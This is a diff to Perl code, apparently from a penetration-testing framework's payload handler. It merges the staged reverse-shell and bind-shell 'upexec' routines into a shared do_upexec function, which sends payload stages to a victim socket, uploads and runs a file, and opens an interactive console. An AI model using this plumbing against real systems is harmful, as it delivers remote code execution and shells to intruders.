@@ -290,7 +290,22 @@ sub reverse_shell_staged_upexec
 
     my $victim = $self->Listener($exploit,$port);
     return(0) if ! $victim;
-    
+
+    my $upload;
+    while (<X>){ $upload.=$_ }
+    close (X);
+
+    return($self->do_upexec($victim, $upload));
+}
+
+sub do_upexec {
+    my $self = shift;
+    my $victim = shift;
+    my $upload = shift;
+    my $blocking = $victim->blocking;
+
+    $victim->blocking(1);
+
     print STDERR "[*] Connected to " . $victim->peerhost() . ":" . $victim->peerport() . "\n";
     
     my $stagecnt = 2;
@@ -301,17 +316,16 @@ sub reverse_shell_staged_upexec
         $stagecnt++;
     }
 
-    my $upload;
-    while (<X>){ $upload.=$_ }
-    close (X);
-
     print STDERR "[*] Sleeping before sending file.\n";
     sleep(2);
-    print STDERR "[*] All stages sent, uploading file (" . length($upload) . ")\n";
+
+    print STDERR "[*] All stages sent, uploading file (" . length($upload) . "), Please wait...\n";
 
     $victim->send(pack('V', length($upload)));
     $victim->send($upload);
     print STDERR "[*] Executing uploaded file...\n\n";
+
+    $victim->blocking($blocking);
 
     my $console = $self->ConsoleStart();
     my $callback = defined($self->GetVar('HCALLBACK')) ? $self->GetVar('HCALLBACK') : sub {};
@@ -320,10 +334,12 @@ sub reverse_shell_staged_upexec
     $self->ConsoleStop($console);
     $callback->("DISCONNECT", $victim);
     
+    $victim->shutdown(2);
     $victim->close();
     undef($victim);
     return(1);
 }
+
 
 # Multistage bind payloads that result in a shell
 sub bind_shell_staged
@@ -372,38 +388,13 @@ sub bind_shell_staged_upexec
     }
     
     my $victim = $self->Connector($exploit, $host, $port);    
-    return if ! $victim;
-
-    print STDERR "[*] Connected to " . $victim->peerhost() . ":" . $victim->peerport() . "\n";
-    
-    my $stagecnt = 2;
-    while (my $stage = $self->GetVar('_Payload')->NextStage())
-    {
-        print STDERR "[*] Uploading stage $stagecnt (".length($stage)." bytes)\n";
-        $victim->send($stage);
-        $stagecnt++;
-    }
-    print STDERR "[*] All stages sent, uploading file\n";
+    return(0) if ! $victim;
 
     my $upload;
     while (<X>){ $upload.=$_ }
     close (X);
-    
-    $victim->send(pack('V', length($upload)));
-    $victim->send($upload);
-    
-    print STDERR "[*] Executing uploaded file...\n\n";
 
-    my $console = $self->ConsoleStart();
-    my $callback = defined($self->GetVar('HCALLBACK')) ? $self->GetVar('HCALLBACK') : sub {};
-    $callback->("CONNECT", $victim);
-    $self->DataPump($console, $victim, $callback);
-    $self->ConsoleStop($console);
-    $callback->("DISCONNECT", $victim);
-    $victim->shutdown(2);
-    $victim->close();
-    undef($victim);
-    return(1);
+    return($self->do_upexec($victim, $upload));
 }
 
 sub reverse_shell_xor
